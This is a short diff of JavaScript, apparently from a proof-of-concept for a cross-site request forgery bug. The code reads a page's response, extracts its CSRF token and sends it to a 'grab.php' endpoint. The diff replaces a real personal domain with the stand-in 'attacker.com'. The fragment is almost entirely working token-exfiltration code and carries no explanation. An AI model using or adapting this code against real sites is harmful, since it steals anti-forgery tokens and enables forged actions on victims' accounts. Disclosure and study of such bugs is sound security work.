@@ -19,7 +19,7 @@
             var str=xmlhttp.responseText;
             var n=str.search("csrf-token");
             var c=str.substring(n+30,n+74);
-            var url = "https://yassineaboukir.com/grab.php?c=" + encodeURIComponent(c);
+            var url = "https://attacker.com/grab.php?c=" + encodeURIComponent(c);
             xmlhttp.open("GET", url, true);
             xmlhttp.send();
          }
